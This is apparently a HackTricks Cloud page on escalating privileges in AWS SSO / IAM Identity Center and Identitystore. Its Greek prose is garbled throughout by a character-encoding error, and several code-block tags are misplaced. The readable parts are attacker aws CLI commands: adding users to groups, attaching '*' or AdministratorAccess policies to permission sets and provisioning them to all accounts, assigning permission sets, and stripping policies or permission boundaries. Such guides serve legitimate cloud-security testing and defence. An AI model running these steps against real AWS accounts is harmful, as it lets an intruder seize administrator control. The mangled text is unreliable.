# AWS - Î ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î‘Î½Î­Î»Î¹Î¾Î·Ï‚ Î£Ï„Î¿Î¹Ï‡ÎµÎ¯Ï‰Î½ SSO & Identitystore

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Î³Î¹Î± Ï„Î¿ hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## ÎšÎ­Î½Ï„ÏÎ¿ Î¤Î±Ï…Ï„ÏŒÏ„Î·Ï„Î±Ï‚ AWS / AWS SSO

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ ÎšÎ­Î½Ï„ÏÎ¿ Î¤Î±Ï…Ï„ÏŒÏ„Î·Ï„Î±Ï‚ AWS / AWS SSO, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î¼ÏŒÎ½Î¿ Î¿Î¹ **Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚** Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **Î±Ï€ÏŒ** Ï„Î¿Î½ **Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î”Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î­Ï‡Î¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎºÎ±Î¹ Î½Î± **ÎµÎ»Î­Î³Ï‡Î¿Ï…Î½ Ï„Î¿ ÎšÎ­Î½Ï„ÏÎ¿ Î¤Î±Ï…Ï„ÏŒÏ„Î·Ï„Î±Ï‚ IAM**.\
ÎŸÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î±Ï€ÏŒ Î¬Î»Î»Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï„Î¿ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Î¼ÏŒÎ½Î¿ ÎµÎ¬Î½ Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ **Î‘Î½Î±Î¸Î­Ï„Î·Î¼Î­Î½Î¿Ï‚ Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚**.\
[Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~Î•Ï€Î±Î½Î±Ï†Î¿ÏÎ¬ ÎšÏ‰Î´Î¹ÎºÎ¿Ï Î ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚~~

ÎˆÎ½Î±Ï‚ ÎµÏÎºÎ¿Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î½Î± Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÏ„Îµ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÏƒÎµ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„Î® Î¸Î± Î®Ï„Î±Î½ Î½Î± Î­Ï‡ÎµÏ„Îµ Î¬Î´ÎµÎ¹Î± Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬ Ï„Ï‰Î½ ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½. Î”Ï…ÏƒÏ„Ï…Ï‡ÏÏ‚, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î¼ÏŒÎ½Î¿ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î­Î½Î± email ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î³Î¹Î± Î½Î± ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï„Î¿Ï…, Î¿Ï€ÏŒÏ„Îµ Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ email Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·.

### `identitystore:CreateGroupMembership`

ÎœÎµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î¿ÏÎ¯ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î±, Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î½Î± ÎºÎ»Î·ÏÎ¿Î½Î¿Î¼ÎµÎ¯ ÏŒÎ»Î± Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î· Î¿Î¼Î¬Î´Î±.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡Î¿ÏÎ·Î³Î®ÏƒÎµÎ¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏƒÎµ Î­Î½Î± Permission Set Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï‡Î¿ÏÎ·Î³Î·Î¸ÎµÎ¯ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Ï…Ï€ÏŒ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡ÏŒ Ï„Î¿Ï….
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡Î¿ÏÎ·Î³Î®ÏƒÎµÎ¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏƒÎµ Î­Î½Î± Permission Set Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï‡Î¿ÏÎ·Î³Î·Î¸ÎµÎ¯ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Ï…Ï€ÏŒ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡ÏŒ Ï„Î¿Ï…. 

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡Î¿ÏÎ·Î³Î®ÏƒÎµÎ¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏƒÎµ Î­Î½Î± Permission Set Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï‡Î¿ÏÎ·Î³Î·Î¸ÎµÎ¯ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Ï…Ï€ÏŒ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡ÏŒ Ï„Î¿Ï….

{% hint style="warning" %}
Î“Î¹Î± Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¿ **ÏŒÎ½Î¿Î¼Î± Î¼Î¹Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î¿ Ï€ÎµÎ»Î¬Ï„Î·Ï‚ ÎºÎ±Î¹ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ ÎŸÎ›ÎŸÎ¥Î£ Ï„Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚** Ï€Î¿Ï… Î¸Î± ÎµÏ€Î·ÏÎµÎ±ÏƒÏ„Î¿ÏÎ½.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:CreateAccountAssignment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´ÏÏƒÎµÎ¹ Î­Î½Î± Permission Set ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Ï…Ï€ÏŒ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡ÏŒ Ï„Î¿Ï… ÏƒÎµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ.
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
### `sso:GetRoleCredentials`

Î•Ï€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Ï„Î± Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î¬ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± STS Î³Î¹Î± Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÏŒÎ½Î¿Î¼Î± ÏÏŒÎ»Î¿Ï… Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î±Î½Î±Ï„ÎµÎ¸ÎµÎ¯ ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î­Î½Î± access token Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î´ÎµÎ½ ÎµÎ¯Î¼Î±Î¹ ÏƒÎ¯Î³Î¿Ï…ÏÎ¿Ï‚ Ï€ÏÏ‚ Î½Î± Ï„Î¿ Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹ Ï„Î· ÏƒÏ…ÏƒÏ‡Î­Ï„Î¹ÏƒÎ· Î¼ÎµÏ„Î±Î¾Ï ÎµÎ½ÏŒÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿Ï… Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Ï„Î·Ï‚ AWS Î±Ï€ÏŒ Ï„Î¿ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÏƒÏÎ½Î¿Î»Î¿ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡Î¿ÏÎ·Î³Î·Î¸Î¿ÏÎ½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î¼Î­ÏƒÏ‰ **Î±Ï€Î¿ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î¼Î¹Î±Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î·Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ (Î±Ï€ÏŒÏÏÎ¹ÏˆÎ· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹ Ï„Î· ÏƒÏ…ÏƒÏ‡Î­Ï„Î¹ÏƒÎ· Î¼ÎµÏ„Î±Î¾Ï Î¼Î¹Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î¿ Ï€ÎµÎ»Î¬Ï„Î·Ï‚ Î±Ï€ÏŒ Ï„Î¿ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÏƒÏÎ½Î¿Î»Î¿ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡Î¿ÏÎ·Î³Î·Î¸Î¿ÏÎ½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î¼Î­ÏƒÏ‰ **Î±Ï€Î¿ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î¼Î¹Î±Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î·Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ (Î±Ï€ÏŒÏÏÎ¹ÏˆÎ· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
### `sso:DeleteInlinePolicyFromPermissionSet`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î±Ï€ÏŒ Î¼Î¹Î± ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î±Ï€ÏŒ Ï„Î¿ ÏƒÏÎ½Î¿Î»Î¿ Î¬Î´ÎµÎ¹ÏÎ½. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡Î¿ÏÎ·Î³Î·Î¸Î¿ÏÎ½ **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Î±Ï€Î¿ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î¼Î¹Î±Ï‚ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î·Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ (Î±Ï€ÏŒÏÏÎ¹ÏˆÎ· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚)**.

{% code overflow="wrap" %}
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
### `sso:DeletePermissionBoundaryFromPermissionSet`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹ Ï„Î¿ ÎŒÏÎ¹Î¿ Î†Î´ÎµÎ¹Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿ ÏƒÏÎ½Î¿Î»Î¿ Î¬Î´ÎµÎ¹Î±Ï‚. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡Î¿ÏÎ·Î³Î·Î¸Î¿ÏÎ½ **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î±Ï†Î±Î¹ÏÏÎ½Ï„Î±Ï‚ Ï„Î¿Ï…Ï‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿ÏÏ‚ Î±Ï€ÏŒ Ï„Î¿ Î£ÏÎ½Î¿Î»Î¿ Î†Î´ÎµÎ¹Î±Ï‚** Ï€Î¿Ï… Î´Î¯Î½Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ ÎŒÏÎ¹Î¿ Î†Î´ÎµÎ¹Î±Ï‚.

{% endcode %}
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
{% endcode %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Î³Î¹Î± Ï„Î¿ hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
